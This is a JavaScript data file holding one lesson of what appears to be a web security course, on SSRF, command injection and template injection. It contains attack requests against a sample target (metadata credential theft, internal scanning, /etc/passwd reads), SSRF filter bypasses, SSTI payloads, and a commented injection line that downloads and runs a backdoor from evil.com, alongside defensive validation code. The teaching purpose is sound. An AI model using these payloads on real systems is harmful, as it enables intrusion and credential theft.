export const lesson = {
  id: 'L41',
  title: 'Server-Side Request Forgery (SSRF) & Injection Attacks',
  slug: 'ssrf-injection',
  type: 'PRACTICAL',
  duration: 50,
  xpReward: 40,
  difficulty: 'advanced',
  module: { title: 'Web Application Security', slug: 'web-security' },
  course: { title: 'Web Security Fundamentals', slug: 'web-security-fundamentals' },
  keyTerms: [
    'SSRF', 'Internal Network', 'Cloud Metadata',
    'Command Injection', 'LDAP Injection', 'Template Injection',
    'Allowlist', 'URL Validation', 'IMDSv2'
  ],
  content: [
    { type: 'heading', content: 'Server-Side Request Forgery (SSRF) & Injection Attacks' },
    { type: 'paragraph', content: 'SSRF makes the SERVER fetch resources on the attacker\'s behalf. Because the server sits inside the network perimeter, it can reach internal services that are invisible from the internet. Command injection forces the server to execute operating system commands. Both turn the application into a tool for the attacker.' },


    { type: 'callout', variant: 'info', content: 'Analogy: SSRF is like calling a company\'s receptionist and saying "Could you please go read what\'s on the whiteboard in the server room and tell me?" The receptionist (server) has access to internal areas you can\'t reach. You\'re using them as a proxy to access restricted resources. Command injection is like telling the receptionist "Also, while you\'re back there, please delete everything on the whiteboard."' },

    { type: 'heading', level: 2, content: 'SSRF: Server-Side Request Forgery' },

    { type: 'heading', level: 3, content: 'How SSRF Works' },
    { type: 'paragraph', content: 'Many web applications fetch external resources based on user input — image URLs, webhooks, file imports, URL previews. If the application doesn\'t validate these URLs, an attacker can make it fetch internal resources:' },
    { type: 'list', items: [
      'User provides a URL → Application fetches that URL server-side',
      'Normal use: "Preview this article link: https://news.com/article"',
      'Attack: "Preview this link: http://169.254.169.254/latest/meta-data/"',
      'The server fetches the AWS metadata endpoint FROM INSIDE the network',
      'Attacker receives IAM credentials, instance details, and secrets'
    ]},

    { type: 'heading', level: 3, content: 'The Capital One Breach (2019)' },
    { type: 'paragraph', content: 'The most famous SSRF attack in history. An attacker exploited SSRF in a misconfigured WAF to access the AWS metadata service, steal IAM role credentials, and exfiltrate 100 million customer records including Social Security numbers.' },

    { type: 'heading', level: 2, content: 'SSRF Attack Scenarios' },

    { type: 'heading', level: 3, content: 'Scenario 1: AWS Metadata Service' },
    { type: 'command', command: 'curl "http://target.com/api/preview?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/ec2-role"', output: `{
  "Code": "Success",
  "LastUpdated": "2024-06-15T10:30:00Z",
  "Type": "AWS-HMAC",
  "AccessKeyId": "AKIAIOSFODNN7EXAMPLE",
  "SecretAccessKey": "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY",
  "Token": "IQoJb3JpZ2luX2VjEAAaDmFwLXNvdXRoZWFzdC0x...",
  "Expiration": "2024-06-15T16:30:00Z"
}`, explanation: 'The application fetches the AWS metadata URL and returns temporary IAM credentials. With these credentials, the attacker can access S3 buckets, databases, and other AWS services — potentially the entire cloud infrastructure.' },

    { type: 'heading', level: 3, content: 'Scenario 2: Internal Network Scanning' },
    { type: 'command', command: 'curl "http://target.com/api/preview?url=http://10.0.1.100:3306/"', output: `Connection to 10.0.1.100:3306 succeeded
5.7.38-MySQL Community Server`, explanation: 'SSRF used to port-scan internal network. The server can reach 10.0.1.100 (internal database) that\'s invisible from the internet. The attacker maps the internal network topology through the vulnerable application.' },

    { type: 'command', command: 'curl "http://target.com/api/preview?url=http://10.0.1.50:8080/admin"', output: `<html><title>Internal Admin Panel</title>
<body>
  <h1>Server Management</h1>
  <a href="/admin/restart">Restart Server</a>
  <a href="/admin/backup">Download Backup</a>
  <a href="/admin/users">Manage Users</a>
</body></html>`, explanation: 'The attacker accesses an internal admin panel that has no authentication (because it\'s "internal only"). Through SSRF, they can click those links: restart servers, download backups, or add admin users.' },

    { type: 'heading', level: 3, content: 'Scenario 3: Reading Local Files' },
    { type: 'command', command: 'curl "http://target.com/api/preview?url=file:///etc/passwd"', output: `root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
mysql:x:27:27:MySQL Server:/var/lib/mysql:/bin/false
app_user:x:1000:1000:App User:/home/app_user:/bin/bash`, explanation: 'Using the file:// protocol scheme, SSRF can read local files on the server. /etc/passwd reveals usernames. An attacker would also try: file:///etc/shadow, file:///app/.env (database credentials), file:///root/.ssh/id_rsa (SSH keys).' },


    { type: 'heading', level: 2, content: 'SSRF Bypass Techniques' },
    { type: 'paragraph', content: 'Attackers use creative URL encodings and redirects to bypass basic filters:' },
    { type: 'list', items: [
      'IP encoding: http://0x7f000001/ (hex for 127.0.0.1)',
      'Decimal IP: http://2130706433/ (integer for 127.0.0.1)',
      'IPv6: http://[::1]/ (localhost in IPv6)',
      'DNS rebinding: attacker\'s domain resolves to 169.254.169.254',
      'Redirect chain: http://attacker.com → 302 redirect → http://169.254.169.254',
      'URL fragments: http://allowed-domain.com@169.254.169.254/',
      'Protocol smuggling: gopher://, dict://, ftp://'
    ]},

    { type: 'heading', level: 2, content: 'Defending Against SSRF' },
    { type: 'list', items: [
      'Allowlist approach: Only permit requests to known-good domains/IPs',
      'Block private IP ranges: 10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16, 127.0.0.0/8, 169.254.0.0/16',
      'Block cloud metadata: Specifically deny 169.254.169.254 and equivalent',
      'Use IMDSv2 on AWS: Requires a token header that SSRF can\'t easily provide',
      'Disable unused URL schemes: Only allow http:// and https://, block file://, gopher://, etc.',
      'DNS resolution check: Resolve the hostname FIRST, then verify the IP isn\'t private/internal',
      'Network segmentation: Application server shouldn\'t reach sensitive internal services',
      'Principle of least privilege: Limit the server\'s IAM role permissions'
    ]},

    { type: 'command', command: 'cat ssrf_defense.py', output: `import ipaddress
import urllib.parse

BLOCKED_RANGES = [
    ipaddress.ip_network('10.0.0.0/8'),
    ipaddress.ip_network('172.16.0.0/12'),
    ipaddress.ip_network('192.168.0.0/16'),
    ipaddress.ip_network('127.0.0.0/8'),
    ipaddress.ip_network('169.254.0.0/16'),
]

def is_safe_url(url):
    parsed = urllib.parse.urlparse(url)
    # Only allow http/https
    if parsed.scheme not in ('http', 'https'):
        return False
    # Resolve hostname to IP and check against blocked ranges
    import socket
    try:
        ip = socket.gethostbyname(parsed.hostname)
        ip_obj = ipaddress.ip_address(ip)
        for network in BLOCKED_RANGES:
            if ip_obj in network:
                return False
    except socket.gaierror:
        return False
    return True`, explanation: 'Server-side URL validation: Blocks private IP ranges, localhost, cloud metadata, and non-HTTP schemes. The hostname is resolved to an IP before checking — preventing DNS-based bypasses.' },

    { type: 'heading', level: 2, content: 'Command Injection' },
    { type: 'paragraph', content: 'Command injection occurs when user input is passed to a system shell. The attacker appends additional commands using shell metacharacters (;, &&, ||, |, `).' },

    { type: 'command', command: 'curl "http://target.com/tools/ping?host=8.8.8.8;cat /etc/passwd"', output: `PING 8.8.8.8 (8.8.8.8): 56 data bytes
64 bytes from 8.8.8.8: icmp_seq=0 ttl=118 time=14.2 ms

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin`, explanation: 'The application runs: ping 8.8.8.8;cat /etc/passwd — the semicolon separates two commands. The server executes both: the legitimate ping AND the attacker\'s command. Full RCE (Remote Code Execution) achieved.' },

    { type: 'command', command: 'cat vulnerable_ping.py', output: `import os
# VULNERABLE: User input directly in shell command
def ping_host(host):
    result = os.system(f"ping -c 4 {host}")  # NEVER DO THIS
    return result

# Attacker input: "8.8.8.8; wget http://evil.com/backdoor.sh | bash"
# Executed: ping -c 4 8.8.8.8; wget http://evil.com/backdoor.sh | bash`, explanation: 'String interpolation into shell commands is always dangerous. The attacker downloads and executes a backdoor script. The fix: never pass user input to shell commands.' },

    { type: 'heading', level: 3, content: 'Command Injection Prevention' },
    { type: 'command', command: 'cat secure_ping.py', output: `import subprocess
import re

def ping_host(host):
    # Validate: only allow IP addresses or hostnames
    if not re.match(r'^[a-zA-Z0-9.\\-]+$', host):
        raise ValueError("Invalid host format")
    
    # SECURE: Use array form — no shell interpretation
    result = subprocess.run(
        ['ping', '-c', '4', host],  # Array, NOT a string
        capture_output=True,
        text=True,
        timeout=10
    )
    return result.stdout`, explanation: 'Two defenses: (1) Input validation with regex whitelist. (2) subprocess.run with array arguments — the OS treats the entire input as ONE argument to ping, not as shell commands. Semicolons are treated as literal characters in the hostname.' },

    { type: 'heading', level: 2, content: 'Template Injection (SSTI)' },
    { type: 'paragraph', content: 'Server-Side Template Injection occurs when user input is embedded directly into a template engine (Jinja2, Twig, Freemarker). Template engines can execute arbitrary code.' },

    { type: 'command', command: 'curl "http://target.com/greet?name={{7*7}}"', output: `Hello, 49!`, explanation: 'The template engine evaluated {{7*7}} as code. If the name parameter isn\'t sanitized, an attacker can escalate to full code execution. 49 instead of "{{7*7}}" confirms the template engine processes input.' },

    { type: 'command', command: 'curl "http://target.com/greet?name={{config.items()}}"', output: `Hello, [('SECRET_KEY', 'super_secret_key_123'), ('DATABASE_URL', 'postgresql://admin:password@db:5432/app')]!`, explanation: 'Jinja2 SSTI: Accessing Flask\'s config object reveals secret keys and database credentials. From here, RCE is possible via Python\'s __import__ or subprocess.' },

    { type: 'heading', level: 2, content: 'Summary & Security Implications' },
    { type: 'list', items: [
      'SSRF turns your server into a proxy for accessing internal resources',
      'Cloud metadata endpoints (169.254.169.254) are the #1 SSRF target — use IMDSv2',
      'URL validation must resolve DNS first, then check the IP (prevents DNS rebinding)',
      'Command injection = full server compromise. Never pass user input to shell commands.',
      'Use parameterized APIs (subprocess array, exec without shell) instead of string interpolation',
      'Template injection can escalate to RCE — validate user input before template rendering',
      'Defense pattern: Allowlist > Blocklist. Define what IS allowed, not what isn\'t.',
      'Network segmentation limits SSRF impact — the app shouldn\'t reach sensitive internal services'
    ]},
  ],
  navigation: {
    prev: { title: 'Cross-Site Request Forgery (CSRF)', slug: 'csrf-attacks' },
    next: { title: 'Broken Access Control & IDOR', slug: 'broken-access-control' },
  },
};
